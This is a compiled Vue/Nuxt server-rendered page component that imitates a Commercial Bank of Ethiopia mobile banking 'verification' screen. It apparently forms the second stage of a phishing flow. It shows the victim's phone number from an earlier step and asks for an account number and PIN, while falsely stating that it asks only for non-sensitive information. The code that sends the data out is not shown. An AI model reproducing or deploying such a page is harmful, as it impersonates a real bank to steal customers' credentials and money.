globalThis.__timing__.logStart('Load chunks/build/verify-0c-Spzgi');import { defineComponent, ref, computed, mergeProps, unref, useSSRContext } from 'vue';
import { ssrRenderAttrs, ssrRenderAttr, ssrInterpolate, ssrIncludeBooleanAttr } from 'vue/server-renderer';
import { _ as _imports_0 } from './virtual_public-GXG8ACDz.mjs';
import { d as useRoute } from './server.mjs';
import '../routes/renderer.mjs';
import 'vue-bundle-renderer/runtime';
import '../nitro/nitro.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'unhead/server';
import 'devalue';
import 'unhead/utils';
import 'vue-router';

const _sfc_main = /* @__PURE__ */ defineComponent({
  __name: "verify",
  __ssrInlineRender: true,
  setup(__props) {
    const route = useRoute();
    const referenceNumber = ref("");
    const otpCode = ref("");
    const isSubmitting = ref(false);
    const statusMessage = ref("Second-page functionality is ready for the next step.");
    const displayPhone = computed(() => {
      const phone = route.query.phone;
      return typeof phone === "string" && phone.trim() ? phone : "not provided";
    });
    return (_ctx, _push, _parent, _attrs) => {
      _push(`<main${ssrRenderAttrs(mergeProps({ class: "mobile-screen" }, _attrs))}><header class="topbar"><div><p class="app-title">CBE Mobile Banking</p><p class="app-subtitle">Verification step</p></div><div class="topbar-actions" aria-label="Quick actions"><button class="icon-button" type="button" aria-label="Notifications"><span class="bell-icon"></span></button><button class="lang-pill" type="button" aria-label="Current language"> EN </button></div></header><section class="hero-card"><div class="logo-wrap" aria-label="Commercial Bank of Ethiopia logo"><img class="logo-image"${ssrRenderAttr("src", _imports_0)} alt="Commercial Bank of Ethiopia logo"></div><div class="hero-copy"><h1>Verification</h1><p class="brand-name">Complete the second step</p><p class="greeting">We only ask for non-sensitive information.</p></div><p class="helper-text"> Enter your account number and PIN code. Phone: <strong>${ssrInterpolate(unref(displayPhone))}</strong></p><label class="input-block" for="reference"><span class="sr-only">Account number</span><input id="reference"${ssrRenderAttr("value", unref(referenceNumber))} type="text" placeholder="Account Number"></label><label class="input-block" for="otp"><span class="sr-only">PIN code</span><input id="otp"${ssrRenderAttr("value", unref(otpCode))} type="text" inputmode="numeric" placeholder="PIN Code"></label><button class="continue-button" type="button" aria-label="Continue"${ssrIncludeBooleanAttr(unref(isSubmitting)) ? " disabled" : ""}><span class="arrow-icon"></span></button><p class="status-text">${ssrInterpolate(unref(statusMessage))}</p><button class="secondary-link" type="button"> Back to phone verification </button></section><footer class="bottom-panel"><div class="chat-row"><span>Need help with verification?</span><button class="chat-pill" type="button">Support</button></div><button class="service-button" type="button"><span class="service-icon">◌</span><span>Verification Services</span></button><p class="copyright">Copyright © Commercial Bank Of Ethiopia</p></footer></main>`);
    };
  }
});
const _sfc_setup = _sfc_main.setup;
_sfc_main.setup = (props, ctx) => {
  const ssrContext = useSSRContext();
  (ssrContext.modules || (ssrContext.modules = /* @__PURE__ */ new Set())).add("pages/verify.vue");
  return _sfc_setup ? _sfc_setup(props, ctx) : void 0;
};

export { _sfc_main as default };;globalThis.__timing__.logEnd('Load chunks/build/verify-0c-Spzgi');
//# sourceMappingURL=verify-0c-Spzgi.mjs.map
